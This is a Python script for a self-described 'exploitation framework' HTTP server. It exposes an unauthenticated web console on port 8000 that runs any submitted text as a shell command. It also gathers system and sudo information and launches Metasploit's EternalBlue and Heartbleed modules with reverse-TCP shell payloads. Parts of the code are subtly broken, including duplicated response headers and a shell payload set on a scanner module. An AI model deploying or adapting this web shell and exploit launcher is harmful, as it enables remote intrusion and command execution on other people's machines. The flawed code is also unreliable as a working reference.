# Escalibur Exploitation Framework - HTTP Server

import subprocess
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        if self.path == '/':
            self.wfile.write(b"<html><body><h1>Welcome to the Escalibur Exploitation Framework</h1></body></html>")
        elif self.path == '/console':
            self.handle_console()
        elif self.path == '/forum':
            self.handle_forum()
        else:
            self.wfile.write(b"<html><body><h1>Page not found</h1></body></html>")

    def handle_console(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Escalibur Console</h1>")
        self.wfile.write(b"<form action='/execute' method='post'>")
        self.wfile.write(b"<input type='text' name='command'>")
        self.wfile.write(b"<input type='submit' value='Execute'>")
        self.wfile.write(b"</form>")
        self.wfile.write(b"</body></html>")

    def handle_forum(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Escalibur Forum</h1>")
        self.wfile.write(b"<p>Welcome to the Escalibur Forum! Feel free to discuss anything related to penetration testing and cybersecurity.</p>")
        self.wfile.write(b"</body></html>")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        command = post_data.split('=')[1]
        if self.path == '/execute':
            output = self.execute_command(command)
        else:
            output = "Invalid command"
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(output.encode())

    def execute_command(self, command):
        try:
            if command.startswith("exit"):
                os._exit(0)
            elif command.startswith("help"):
                return "Available commands:<br>- execute <command><br>- list_files [<directory>]<br>- system_info<br>- escalate_privileges<br>- show_exploits<br>- exploit <exploit_name><br>- connect <ip_address><br>- RHOST <ip_address><br>- LHOST <ip_address>"
            elif command.startswith("execute"):
                command = command.split(" ", 1)[1]
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode()
            elif command.startswith("list_files"):
                directory = command.split(" ", 1)[1] if len(command.split(" ")) > 1 else "."
                files = os.listdir(directory)
                return "<br>".join(files)
            elif command.startswith("system_info"):
                uname = subprocess.check_output("uname -a", shell=True).decode()
                hostname = subprocess.check_output("hostname", shell=True).decode()
                ip_address = subprocess.check_output("hostname -I", shell=True).decode()
                return f"Hostname: {hostname}<br>IP Address: {ip_address}<br>System Info: {uname}"
            elif command.startswith("escalate_privileges"):
                if os.getuid() != 0:
                    return subprocess.check_output("sudo -l", shell=True).decode()
                else:
                    return "Already running with root privileges."
            elif command.startswith("show_exploits"):
                return "Available exploits:<br>- eternalblue<br>- heartbleed"
            elif command.startswith("exploit"):
                exploit_name = command.split(" ", 1)[1]
                return self.run_exploit(exploit_name)
            elif command.startswith("connect"):
                ip_address = command.split(" ", 1)[1]
                return f"Connected to {ip_address}"
            elif command.startswith("RHOST"):
                ip_address = command.split(" ", 1)[1]
                return f"Target IP set to {ip_address}"
            elif command.startswith("LHOST"):
                ip_address = command.split(" ", 1)[1]
                return f"Local IP set to {ip_address}"
            else:
                return "Invalid command"
        except Exception as e:
            return str(e)

    def run_exploit(self, exploit_name):
        exploit_map = {
            "eternalblue": {
                "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {}; set payload windows/meterpreter/reverse_tcp; set LHOST {}; exploit'"
            },
            "heartbleed": {
                "command": "msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS {}; set payload generic/shell_reverse_tcp; set LHOST {}; exploit'"
            }
        }
        exploit = exploit_map.get(exploit_name.lower())
        if exploit:
            target_ip = "127.0.0.1"
            local_ip = "127.0.0.1"
            command = exploit["command"].format(target_ip, local_ip)
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode()
            except Exception as e:
                return str(e)
        else:
            return f"Exploit '{exploit_name}' not found"

class HTTPServerWithConsole(threading.Thread):
    def run(self):
        server_address = ('', 8000)
        httpd = HTTPServer(server_address, RequestHandler)
        print("HTTP Server with Console started on port 8000...")
        httpd.serve_forever()

def main():
    print("Welcome to the Escalibur Exploitation Framework - HTTP Server")
    print("The HTTP server with console is running in the background.")
    print("Access the console at http://localhost:8000/console")
    print("Access the forum at http://localhost:8000/forum")
    print("Type 'exit' to stop the HTTP server.")

    http_server_thread = HTTPServerWithConsole()
    http_server_thread.daemon = True
    http_server_thread.start()

    while True:
        user_input = input("> ")
        if user_input.lower() == "exit":
            print("Stopping HTTP Server...")
            os._exit(0)
        else:
            print("Invalid command. Type 'exit' to stop the HTTP server.")

if __name__ == "__main__":
    main()
